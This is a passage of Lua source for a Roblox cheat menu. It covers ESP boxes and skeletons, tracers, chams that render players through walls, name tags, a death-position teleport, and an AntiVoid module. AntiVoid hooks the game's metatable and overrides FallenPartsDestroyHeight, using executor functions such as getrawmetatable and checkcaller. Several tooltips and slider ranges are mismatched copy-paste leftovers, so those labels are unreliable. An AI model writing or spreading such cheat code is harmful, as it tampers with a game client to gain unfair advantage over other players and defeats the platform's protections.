											line2clone.BackgroundTransparency = 0.5
											line2clone.Position = UDim2.new(0, 0, 1, -3)
											line2clone.BackgroundColor3 = Color3.new(0, 0, 0)
											line2clone.Parent = thing
											local line3clone = line3:Clone()
											line3clone.ZIndex = 1
											line3clone.Size = UDim2.new(0, 3, 1, 0)
											line3clone.BackgroundTransparency = 0.5
											line3clone.Position = UDim2.new(0, 0, 0, 0)
											line3clone.BackgroundColor3 = Color3.new(0, 0, 0)
											line3clone.Parent = thing
											local line4clone = line4:Clone()
											line4clone.ZIndex = 1
											line4clone.Size = UDim2.new(0, 3, 1, 0)
											line4clone.BackgroundTransparency = 0.5
											line4clone.Position = UDim2.new(1, -3, 0, 0)
											line4clone.BackgroundColor3 = Color3.new(0, 0, 0)
											line4clone.Parent = thing
											local healthline = Instance.new("Frame")
											healthline.BorderSizePixel = 0
											healthline.Name = "HealthLineMain"
											healthline.ZIndex = 2
											healthline.AnchorPoint = Vector2.new(0, 1)
											healthline.Visible = ESPHealthBar["Enabled"]
											healthline.Size = UDim2.new(0, 1, 1, -2)
											healthline.Position = UDim2.new(0, -4, 1, -1)
											healthline.BackgroundColor3 = Color3.new(0, 1, 0)
											healthline.Parent = thing
											local healthlineclone = healthline:Clone()
											healthlineclone.ZIndex = 1
											healthlineclone.AnchorPoint = Vector2.new(0, 0)
											healthlineclone.Size = UDim2.new(0, 3, 1, 0)
											healthlineclone.BackgroundTransparency = 0.5
											healthlineclone.Visible = ESPHealthBar["Enabled"]
											healthlineclone.Name = "HealthLineBKG"
											healthlineclone.Position = UDim2.new(0, -5, 0, 0)
											healthlineclone.BackgroundColor3 = Color3.new(0, 0, 0)
											healthlineclone.Parent = thing
										end

										if isAlive(plr) and plr ~= lplr and (ESPTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
											local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
											local rootSize = (plr.Character.HumanoidRootPart.Size.X * 1200) * (cam.ViewportSize.X / 1920)
											local headPos, headVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position + Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
											local legPos, legVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position - Vector3.new(0, 1 + (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and 2 or plr.Character.Humanoid.HipHeight), 0))
											rootPos = rootPos
											if rootVis then
												if ESPHealthBar["Enabled"] then
													local color = HealthbarColorTransferFunction(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth)
													thing.HealthLineMain.BackgroundColor3 = color
													thing.HealthLineMain.Size = UDim2.new(0, 1, math.clamp(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth, 0, 1), (math.clamp(plr.Character.Humanoid.Health / plr.Character.Humanoid.MaxHealth, 0, 1) == 0 and 0 or -2))
												end
												thing.Visible = rootVis
												thing.Size = UDim2.new(0, rootSize / rootPos.Z, 0, headPos.Y - legPos.Y)
												thing.Position = UDim2.new(0, rootPos.X - thing.Size.X.Offset / 2, 0, (rootPos.Y - thing.Size.Y.Offset / 2) - 36)
											end
										end
									end
									if ESPMethod["Value"] == "Skeleton" then
										if ESPFolder:FindFirstChild(plr.Name) then
											thing = ESPFolder[plr.Name]
											thing.Visible = false
											for linenum, line in pairs(thing:GetChildren()) do
												line.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											end
										else
											thing = Instance.new("Frame")
											thing.BackgroundTransparency = 1
											thing.BorderSizePixel = 0
											thing.Visible = false
											thing.Name = plr.Name
											thing.Parent = ESPFolder
											local line1 = Instance.new("Frame")
											line1.BorderSizePixel = 0
											line1.Name = "TopTorsoLine"
											line1.AnchorPoint = Vector2.new(0.5, 0.5)
											line1.ZIndex = 2
											line1.Size = UDim2.new(0, 0, 0, 0)
											line1.Position = UDim2.new(0, 0, 0, 0)
											line1.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(ESPColor["Hue"], ESPColor["Sat"], ESPColor["Value"])
											line1.Parent = thing
											local line2 = line1:Clone()
											line2.Name = "MiddleTorsoLine"
											line2.Parent = thing
											local line3 = line1:Clone()
											line3.Name = "BottomTorsoLine"
											line3.Parent = thing
											local line4 = line1:Clone()
											line4.Name = "LeftArm"
											line4.Parent = thing
											local line5 = line1:Clone()
											line5.Name = "RightArm"
											line5.Parent = thing
											local line6 = line1:Clone()
											line6.Name = "LeftLeg"
											line6.Parent = thing
											local line7 = line1:Clone()
											line7.Name = "RightLeg"
											line7.Parent = thing
											local line8 = line1:Clone()
											line8.Name = "Head"
											line8.Parent = thing
											local line9 = line1:Clone()
											line9.Name = "HeadForward"
											line9.Parent = thing
										end

										if isAlive(plr) and plr ~= lplr and (ESPTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
											local rootPos, rootVis = cam:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
											if rootVis and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Arm" or "LeftHand")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Arm" or "RightHand")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Leg" or "LeftFoot")) and plr.Character:FindFirstChild((plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Leg" or "RightFoot")) and plr.Character:FindFirstChild("Head") then
												thing.Visible = true
												local head = CalculateObjectPosition((plr.Character["Head"].CFrame).p)
												local headfront = CalculateObjectPosition((plr.Character["Head"].CFrame * CFrame.new(0, 0, -0.5)).p)
												local toplefttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(-1.5, 0.8, 0)).p)
												local toprighttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(1.5, 0.8, 0)).p)
												local toptorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0, 0.8, 0)).p)
												local bottomtorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local bottomlefttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(-0.5, -0.8, 0)).p)
												local bottomrighttorso = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Torso" or "UpperTorso")].CFrame * CFrame.new(0.5, -0.8, 0)).p)
												local leftarm = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Arm" or "LeftHand")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local rightarm = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Arm" or "RightHand")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local leftleg = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Left Leg" or "LeftFoot")].CFrame * CFrame.new(0, -0.8, 0)).p)
												local rightleg = CalculateObjectPosition((plr.Character[(plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 and "Right Leg" or "RightFoot")].CFrame * CFrame.new(0, -0.8, 0)).p)
												CalculateLine(toplefttorso, toprighttorso, thing.TopTorsoLine)
												CalculateLine(toptorso, bottomtorso, thing.MiddleTorsoLine)
												CalculateLine(bottomlefttorso, bottomrighttorso, thing.BottomTorsoLine)
												CalculateLine(toplefttorso, leftarm, thing.LeftArm)
												CalculateLine(toprighttorso, rightarm, thing.RightArm)
												CalculateLine(bottomlefttorso, leftleg, thing.LeftLeg)
												CalculateLine(bottomrighttorso, rightleg, thing.RightLeg)
												CalculateLine(toptorso, head, thing.Head)
												CalculateLine(head, headfront, thing.HeadForward)
											end
										end
									end
								end
							end
						end)
					end)
				else
					UnbindFromRenderStep("ESP") 
					ESPFolder:ClearAllChildren()
					for i,v in pairs(espfolderdrawing) do 
						pcall(function()
							espfolderdrawing[i].Quad1:Remove()
							espfolderdrawing[i].Quad2:Remove()
							espfolderdrawing[i].Quad3:Remove()
							espfolderdrawing[i].Quad4:Remove()
							espfolderdrawing[i] = nil
						end)
						pcall(function()
							espfolderdrawing[i].Head:Remove()
							espfolderdrawing[i].Head2:Remove()
							espfolderdrawing[i].Torso:Remove()
							espfolderdrawing[i].Torso2:Remove()
							espfolderdrawing[i].Torso3:Remove()
							espfolderdrawing[i].LeftArm:Remove()
							espfolderdrawing[i].RightArm:Remove()
							espfolderdrawing[i].LeftLeg:Remove()
							espfolderdrawing[i].RightLeg:Remove()
							espfolderdrawing[i] = nil
						end)
					end
				end
			end,
			["HoverText"] = "See where everyone is at with boxes"
		})
		ESPMethod = ESP.CreateDropdown({
			["Name"] = "Mode",
			["List"] = {"2D", "Skeleton"},
			["Function"] = function(val)
				ESPFolder:ClearAllChildren()
				for i,v in pairs(espfolderdrawing) do 
					spawn(function()
						pcall(function()
							espfolderdrawing[i].Quad1:Remove()
							espfolderdrawing[i].Quad2:Remove()
							espfolderdrawing[i].Quad3:Remove()
							espfolderdrawing[i].Quad4:Remove()
							espfolderdrawing[i] = nil
						end)
						pcall(function()
							espfolderdrawing[i].Head:Remove()
							espfolderdrawing[i].Head2:Remove()
							espfolderdrawing[i].Torso:Remove()
							espfolderdrawing[i].Torso2:Remove()
							espfolderdrawing[i].Torso3:Remove()
							espfolderdrawing[i].LeftArm:Remove()
							espfolderdrawing[i].RightArm:Remove()
							espfolderdrawing[i].LeftLeg:Remove()
							espfolderdrawing[i].RightLeg:Remove()
							espfolderdrawing[i] = nil
						end)
					end)
				end
				ESPHealthBar["Object"].Visible = (val == "2D")
			end,
		})
		ESPColor = ESP.CreateColorSlider({
			["Name"] = "Player Color", 
			["Function"] = function(val) end
		})
		ESPHealthBar = ESP.CreateToggle({
			["Name"] = "Health Bar", 
			["Function"] = function(callback)
				if callback then 
					for i,v in pairs(ESPFolder:GetChildren()) do
						v.HealthLineMain.Visible = true
						v.HealthLineBKG.Visible = true
					end
				else
					for i,v in pairs(ESPFolder:GetChildren()) do
						v.HealthLineMain.Visible = false
						v.HealthLineBKG.Visible = false
					end
				end
			end
		})

	end)

	runcode(function()
		local TracersFolder = Instance.new("Folder")
		TracersFolder.Name = "TracersFolder"
		TracersFolder.Parent = GuiLibrary["MainGui"]
		local TracersDrawing = {["Enabled"] = false}
		local tracersdrawingtab = {}
		players.PlayerRemoving:connect(function(plr)
			if TracersFolder:FindFirstChild(plr.Name) then
				TracersFolder[plr.Name]:Remove()
			end
			if tracersdrawingtab[plr.Name] then 
				pcall(function()
					tracersdrawingtab[plr.Name]:Remove()
					tracersdrawingtab[plr.Name] = nil
				end)
			end
		end)
		local TracersColor = {["Value"] = 0.44}
		local TracersTransparency = {["Value"] = 1}
		local TracersStartPosition = {["Value"] = "Middle"}
		local TracersEndPosition = {["Value"] = "Head"}
		local TracersTeammates = {["Enabled"] = true}
		local Tracers = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Tracers", 
			["Function"] = function(callback) 
				if callback then

					spawn(function()
						BindToRenderStep("Tracers", 500, function()
							for i,plr in pairs(players:GetChildren()) do
								local thing
								if TracersDrawing["Enabled"] then
									if tracersdrawingtab[plr.Name] then 
										thing = tracersdrawingtab[plr.Name]
										thing.Visible = false
									else
										thing = Drawing.new("Line")
										thing.Thickness = 1
										thing.Visible = false
										tracersdrawingtab[plr.Name] = thing
									end

									if isAlive(plr) and plr ~= lplr and (TracersTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										local rootScrPos = cam:WorldToViewportPoint((TracersEndPosition["Value"] == "Head" and plr.Character.Head or plr.Character.HumanoidRootPart).Position)
										local tempPos = cam.CFrame:pointToObjectSpace((TracersEndPosition["Value"] == "Head" and plr.Character.Head or plr.Character.HumanoidRootPart).Position)
										if rootScrPos.Z < 0 then
											tempPos = CFrame.Angles(0, 0, (math.atan2(tempPos.Y, tempPos.X) + math.pi)):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(Vector3.new(0, 0, -1))));
										end
										local tracerPos = cam:WorldToViewportPoint(cam.CFrame:pointToWorldSpace(tempPos))
										local screensize = cam.ViewportSize
										local startVector = Vector2.new(screensize.X / 2, (TracersStartPosition["Value"] == "Middle" and screensize.Y / 2 or screensize.Y))
										local endVector = Vector2.new(tracerPos.X, tracerPos.Y)
										local Distance = (startVector - endVector).Magnitude
										startVector = startVector
										endVector = endVector
										thing.Visible = true
										thing.Transparency = 1 - TracersTransparency["Value"] / 100
										thing.Color = getPlayerColor(plr) or Color3.fromHSV(TracersColor["Hue"], TracersColor["Sat"], TracersColor["Value"])
										thing.From = startVector
										thing.To = endVector
									end
								else
									if TracersFolder:FindFirstChild(plr.Name) then
										thing = TracersFolder[plr.Name]
										if thing.Visible then
											thing.Visible = false
										end
									else
										thing = Instance.new("Frame")
										thing.BackgroundTransparency = 0
										thing.AnchorPoint = Vector2.new(0.5, 0.5)
										thing.BackgroundColor3 = Color3.new(0, 0, 0)
										thing.BorderSizePixel = 0
										thing.Visible = false
										thing.Name = plr.Name
										thing.Parent = TracersFolder
									end

									if isAlive(plr) and plr ~= lplr and (TracersTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										local rootScrPos = cam:WorldToViewportPoint((TracersEndPosition["Value"] == "Head" and plr.Character.Head or plr.Character.HumanoidRootPart).Position)
										local tempPos = cam.CFrame:pointToObjectSpace((TracersEndPosition["Value"] == "Head" and plr.Character.Head or plr.Character.HumanoidRootPart).Position)
										if rootScrPos.Z < 0 then
											tempPos = CFrame.Angles(0, 0, (math.atan2(tempPos.Y, tempPos.X) + math.pi)):vectorToWorldSpace((CFrame.Angles(0, math.rad(89.9), 0):vectorToWorldSpace(Vector3.new(0, 0, -1))));
										end
										local tracerPos = cam:WorldToViewportPoint(cam.CFrame:pointToWorldSpace(tempPos))
										local screensize = cam.ViewportSize
										local startVector = Vector2.new(screensize.X / 2, (TracersStartPosition["Value"] == "Middle" and screensize.Y / 2 or screensize.Y))
										local endVector = Vector2.new(tracerPos.X, tracerPos.Y)
										local Distance = (startVector - endVector).Magnitude
										startVector = startVector
										endVector = endVector
										thing.Visible = true
										thing.BackgroundTransparency = TracersTransparency["Value"] / 100
										thing.BackgroundColor3 = getPlayerColor(plr) or Color3.fromHSV(TracersColor["Hue"], TracersColor["Sat"], TracersColor["Value"])
										thing.Size = UDim2.new(0, Distance, 0, 2)
										thing.Position = UDim2.new(0, (startVector.X + endVector.X) / 2, 0, ((startVector.Y + endVector.Y) / 2) - 36)
										thing.Rotation = math.atan2(endVector.Y - startVector.Y, endVector.X - startVector.X) * (180 / math.pi)
									end
								end
							end
						end)
					end)
				else
					UnbindFromRenderStep("Tracers") 
					TracersFolder:ClearAllChildren()
					for i,v in pairs(tracersdrawingtab) do 
						pcall(function()
							v:Remove()
							tracersdrawingtab[i] = nil
						end)
					end
				end
			end,
			["HoverText"] = "See where everyone is at with lines"
		})
		TracersStartPosition = Tracers.CreateDropdown({
			["Name"] = "Start Position",
			["List"] = {"Middle", "Bottom"},
			["Function"] = function() end
		})
		TracersEndPosition = Tracers.CreateDropdown({
			["Name"] = "End Position",
			["List"] = {"Head", "Torso"},
			["Function"] = function() end
		})
		TracersColor = Tracers.CreateColorSlider({
			["Name"] = "Player Color", 
			["Function"] = function(val) end
		})
		TracersTransparency = Tracers.CreateSlider({
			["Name"] = "Transparency", 
			["Min"] = 1,
			["Max"] = 100, 
			["Function"] = function(val) end,
			["Default"] = 0
		})

	end)

	runcode(function()
		local Breadcrumbs = {["Enabled"] = false}
		local BreadcrumbsLifetime = {["Value"] = 20}
		local breadcrumbtrail
		local breadcrumbattachment
		local breadcrumbattachment2
		Breadcrumbs = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Breadcrumbs",
			["Function"] = function(callback)
				if callback then
					spawn(function()
						repeat
							task.wait(0.3)
							if (not Breadcrumbs["Enabled"]) then return end
							local PrivatePlr = game.Players.LocalPlayer
							if PrivatePlr.Character.Humanoid.Health >= 0.1 then
								if breadcrumbtrail == nil then
									breadcrumbattachment = Instance.new("Attachment")
									breadcrumbattachment.Position = Vector3.new(0, 0.07 - 2.9, 0.5)
									breadcrumbattachment2 = Instance.new("Attachment")
									breadcrumbattachment2.Position = Vector3.new(0, -0.07 - 2.9, 0.5)
									breadcrumbtrail = Instance.new("Trail")
									breadcrumbtrail.Attachment0 = breadcrumbattachment 
									breadcrumbtrail.Attachment1 = breadcrumbattachment2
									breadcrumbtrail.Color = ColorSequence.new(Color3.new(1, 0, 0), Color3.new(0, 0, 1))
									breadcrumbtrail.FaceCamera = true
									breadcrumbtrail.Lifetime = BreadcrumbsLifetime["Value"] / 10
									breadcrumbtrail.Enabled = true
									breadcrumbtrail.Parent = cam
								else
									breadcrumbattachment.Parent = PrivatePlr.character.HumanoidRootPart
									breadcrumbattachment2.Parent = PrivatePlr.character.HumanoidRootPart
									breadcrumbtrail.Parent = cam
								end
							end
						until (not Breadcrumbs["Enabled"])
					end)
				else
					if breadcrumbtrail then
						breadcrumbtrail:Remove()
						breadcrumbtrail = nil
					end
				end
			end,
			["HoverText"] = "Shows a trail behind your character"
		})
		BreadcrumbsLifetime = Breadcrumbs.CreateSlider({
			["Name"] = "Lifetime",
			["Min"] = 1,
			["Max"] = 100,
			["Function"] = function(val) end,
			["Default"] = 20
		})

	end)

	runcode(function()
		local ChamsFolder = Instance.new("Folder")
		ChamsFolder.Name = "ChamsFolder"
		ChamsFolder.Parent = GuiLibrary["MainGui"]
		players.PlayerRemoving:connect(function(plr)
			if ChamsFolder:FindFirstChild(plr.Name) then
				ChamsFolder[plr.Name]:Remove()
			end
		end)
		local ChamsColor = {["Value"] = 0.44}
		local ChamsOutlineColor = {["Value"] = 0.44}
		local ChamsBetter = {["Enabled"] = false}
		local ChamsTransparency = {["Value"] = 1}
		local ChamsOutlineTransparency = {["Value"] = 1}
		local ChamsOnTop = {["Enabled"] = true}
		local chamobjects = {["Head"] = true, ["Torso"] = true, ["UpperTorso"] = true, ["LowerTorso"] = true, ["Left Arm"] = true, ["Left Leg"] = true, ["Right Arm"] = true, ["Right Leg"] = true, ["LeftLowerLeg"] = true, ["RightLowerLeg"] = true, ["LeftUpperLeg"] = true, ["RightUpperLeg"] = true, ["LeftFoot"] = true, ["RightFoot"] = true, ["LeftLowerArm"] = true, ["RightLowerArm"] = true, ["LeftUpperArm"] = true, ["RightUpperArm"] = true, ["LeftHand"] = true, ["RightHand"] = true}
		local ChamsTeammates = {["Enabled"] = true}
		local Chams = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Chams", 
			["Function"] = function(callback) 
				if callback then
					spawn(function()
						BindToRenderStep("Chams", 500, function()
							for i,plr in pairs(players:GetChildren()) do
								if ChamsBetter["Enabled"] then
									local thing
									if ChamsFolder:FindFirstChild(plr.Name) then
										thing = ChamsFolder[plr.Name]
										thing.Enabled = false
										thing.FillColor = getPlayerColor(plr) or Color3.fromHSV(ChamsColor["Hue"], ChamsColor["Sat"], ChamsColor["Value"])
										thing.OutlineColor = Color3.fromHSV(ChamsOutlineColor["Hue"], ChamsOutlineColor["Sat"], ChamsOutlineColor["Value"])
									end

									if isAlive(plr) and plr ~= lplr and (ChamsTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										if ChamsFolder:FindFirstChild(plr.Name) == nil then
											local chamfolder = Instance.new("Highlight")
											chamfolder.Name = plr.Name
											chamfolder.Parent = ChamsFolder
											thing = chamfolder
										end
										thing.Enabled = true
										thing.Adornee = plr.Character
										thing.OutlineTransparency = ChamsOutlineTransparency["Value"] / 100
										thing.DepthMode = Enum.HighlightDepthMode[(ChamsOnTop["Enabled"] and "AlwaysOnTop" or "Occluded")]
										thing.FillTransparency = ChamsTransparency["Value"] / 100
									end
								else
									local thing
									if ChamsFolder:FindFirstChild(plr.Name) then
										thing = ChamsFolder[plr.Name]
										for partnumber, part in pairs(thing:GetChildren()) do
											part.Visible = false
											part.Color3 = getPlayerColor(plr) or Color3.fromHSV(ChamsColor["Hue"], ChamsColor["Sat"], ChamsColor["Value"])
										end
									end

									if isAlive(plr) and plr ~= lplr and (ChamsTeammates["Enabled"] or shared.vapeteamcheck(plr)) then
										if ChamsFolder:FindFirstChild(plr.Name) == nil then
											local chamfolder = Instance.new("Folder")
											chamfolder.Name = plr.Name
											chamfolder.Parent = ChamsFolder
											thing = chamfolder
											for partnumber, part in pairs(plr.Character:GetChildren()) do
												if chamobjects[part.Name] then
													local boxhandle = Instance.new("BoxHandleAdornment")
													boxhandle.Size = (part.Name == "Head" and Vector3.new(1.25, 1.25, 1.25) or part.Size) + Vector3.new(.01, .01, .01)
													boxhandle.AlwaysOnTop = ChamsOnTop["Enabled"]
													boxhandle.ZIndex = 10
													boxhandle.Visible = true
													boxhandle.Color3 = getPlayerColor(plr) or Color3.fromHSV(ChamsColor["Hue"], ChamsColor["Sat"], ChamsColor["Value"])
													boxhandle.Name = part.Name
													boxhandle.Parent = chamfolder
												end
											end
										end
										for partnumber, part in pairs(thing:GetChildren()) do
											part.Visible = true
											if plr.Character:FindFirstChild(part.Name) then
												part.Adornee = plr.Character[part.Name]
												part.AlwaysOnTop = ChamsOnTop["Enabled"]
												part.Transparency = ChamsTransparency["Value"] / 100
											end
										end
									end
								end
							end
						end)
					end)
				else
					UnbindFromRenderStep("Chams")
					ChamsFolder:ClearAllChildren()
				end
			end,
			["HoverText"] = "Render players through walls"
		})
		ChamsColor = Chams.CreateColorSlider({
			["Name"] = "Player Color", 
			["Function"] = function(val) end
		})
		ChamsTransparency = Chams.CreateSlider({
			["Name"] = "Transparency", 
			["Min"] = 1,
			["Max"] = 100, 
			["Function"] = function(val) end,
			["Default"] = 50
		})

	end)

	runcode(function()
		local lightingchanged = false
		GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Fullbright",
			["Function"] = function(callback)
				if callback then 
					game.Lighting.GlobalShadows = false
				else
					game.Lighting.GlobalShadows = true
				end
			end
		})

	end)

	runcode(function()
		local DeathTeleport = {["Enabled"] = false}
		local DelayClick = {["Value"] = 4}
		local DeathX = 0
		local DeathY = 0
		local DeathZ = 0
		local CanDie = false

		DeathTeleport = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "DeathTeleport",
			["Function"] = function(callback) if callback then 
					spawn(function()

						local MainCharacter = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name)
						MainCharacter.Humanoid.Died:Connect(function()
							if DeathTeleport.Enabled == true then
								DeathX = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.X
								DeathY = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.Y
								DeathZ = game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.Z
							end
						end)

						game.Players.LocalPlayer.PlayerGui.SpawnGui.PlayButton.MouseButton1Up:Connect(function()
							if DeathTeleport.Enabled == true then
								wait(DelayClick.Value)
								game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.CFrame = CFrame.new(DeathX, DeathY, DeathZ)
							end
						end)
					end)
				else

				end
			end,
			["HoverText"] = "if you die you will teleport to your death position and maybe get revenge or just collect your stuff", 
			["Default"] = false,

		})
		DelayClick = DeathTeleport.CreateSlider({
			["Name"] = "Delay when press play",
			["Min"] = 1,
			["Max"] = 10,
			["Function"] = function(val) end,
			["Default"] = 4
		})
		--[[
		DeathTeleport.CreateButton({
			["Name"] = "Death Position", 
			["Function"] = function(callback) 
				if DeathX == 0 and DeathY == 0 and DeathZ == 0 then
				else
					game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.CFrame = CFrame.new(DeathX, DeathY, DeathZ)
				end
			end, 
		})
]]
	end)

	runcode(function()
		local AntiVoid = {["Enabled"] = false}
		local AntiVoidMethod = {["Value"] = "Teleport"}
		local AntiVoidY = {["Value"] = -400}
		AntiVoid = GuiLibrary["ObjectsThatCanBeSaved"]["WorldWindow"]["Api"].CreateOptionsButton({
			["Name"] = "AntiVoid",
			["Function"] = function(callback) if callback then 
					spawn(function()
						if AntiVoid.Enabled == true then
							local newindex = getrawmetatable(game).__newindex;
							setreadonly(getrawmetatable(game),false);

							getrawmetatable(game).__newindex = function(t,i,v)
								if i=="FallenPartsDestroyHeight" and not checkcaller() and AntiVoid.Enabled == true then
									return newindex(t,i,16);
								end
								return newindex(t,i,v);
							end
						end
						while game:GetService("RunService").Heartbeat:Wait() and AntiVoid.Enabled == true do
							game.Workspace.FallenPartsDestroyHeight = -50000
							if game.Workspace.Characters:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart.Position.Y <= AntiVoidY.Value then
								if AntiVoidMethod.Value == "Teleport" then
									local r = math.random(1,3)
									if r == 1 then
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1022, -4.5, -808)	
										wait(5)
									end
									if r == 2 then
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1145, 21, 1252)	
										wait(5)
									end
									if r == 3 then
										wait(5)
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-70.602, 219.301, -617.171)	
									end
								end
								if AntiVoidMethod.Value == "Crash" then
									local msgbox = messagebox("AntiVoid",tostring("You deid in the void"),4)
									setfpscap(math.huge)
									wait(5)
								end
							end
						end
					end)
				else

				end
			end,
			["HoverText"] = "kicks you when someone has this in the group", 
			["Default"] = false,

		})
		AntiVoidMethod = AntiVoid.CreateDropdown({
			["Name"] = "Select Method",
			["List"] = {"Teleport", "Crash"},
			["Function"] = function(val)
			end
		})
		AntiVoidY = AntiVoid.CreateSlider({
			["Name"] = "AntiVoidY",
			["Min"] = -400,
			["Max"] = -5000,
			["Function"] = function(val)
			end,
			["HoverText"] = "changes the range of the kill aura",
			["Default"] = -400
		})

	end)

	runcode(function()
		local HealthText = Instance.new("TextLabel")
		HealthText.Font = Enum.Font.SourceSans
		HealthText.TextSize = 20
		HealthText.Text = "100"
		HealthText.Position = UDim2.new(0.5, 0, 0.5, 70)
		HealthText.BackgroundTransparency = 1
		HealthText.TextColor3 = Color3.fromRGB(255, 0, 0)
		HealthText.Size = UDim2.new(0, 0, 0, 0)
		HealthText.Visible = false
		HealthText.Parent = GuiLibrary["MainGui"]
		local Health = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Health", 
			["Function"] = function(callback) 
				spawn(function()
					if callback then
						HealthText.Visible = true
						BindToRenderStep("Health", 1, function()
							local PrivatePlr = game.Players.LocalPlayer
							if PrivatePlr.Character.Humanoid.Health >= 0.1 then
								HealthText.Text = tostring(math.round(PrivatePlr.character.Humanoid.Health))..""
							end
						end)
					else
						HealthText.Visible = false
						UnbindFromRenderStep("Health")
					end
				end)
			end,
			["HoverText"] = "Displays your health in the center of your screen."
		})

	end)

	runcode(function()
		local function removeTags(str)
			str = str:gsub("<br%s*/>", "\n")
			return (str:gsub("<[^<>]->", ""))
		end

		local function floorpos(pos)
			return Vector2.new(math.floor(pos.X), math.floor(pos.Y))
		end

		local NameTagsFolder = Instance.new("Folder")
		NameTagsFolder.Name = "NameTagsFolder"
		NameTagsFolder.Parent = GuiLibrary["MainGui"]
		local nametagsfolderdrawing = {}
		players.PlayerRemoving:connect(function(plr)
			if NameTagsFolder:FindFirstChild(plr.Name) then
				NameTagsFolder[plr.Name]:Remove()
			end
			if nametagsfolderdrawing[plr.Name] then 
				pcall(function()
					nametagsfolderdrawing[plr.Name].Text:Remove()
					nametagsfolderdrawing[plr.Name].BG:Remove()
					nametagsfolderdrawing[plr.Name] = nil
				end)
			end
		end)
		local NameTagsColor = {["Value"] = 0.44}
		local NameTagsDisplayName = {["Enabled"] = false}
		local NameTagsHealth = {["Enabled"] = false}
		local NameTagsDistance = {["Enabled"] = false}
		local NameTagsDrawing = {["Enabled"] = false}
		local NameTagsBackground = {["Enabled"] = true}
		local NameTagsScale = {["Value"] = 10}
		local NameTagsFont = {["Value"] = "SourceSans"}
		local NameTagsTeammates = {["Enabled"] = true}
		local fontitems = {"SourceSans"}
		local NameTags = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({
			["Name"] = "NameTags", 
			["Function"] = function(callback) 
				if callback then
					spawn(function()

						BindToRenderStep("NameTags", 10, function()
							for i,plr in pairs(players:GetChildren()) do
								local thing
								if NameTagsDrawing["Enabled"] then
									if nametagsfolderdrawing[plr.Name] then
										thing = nametagsfolderdrawing[plr.Name]
										thing.Text.Visible = false
										thing.BG.Visible = false
									else
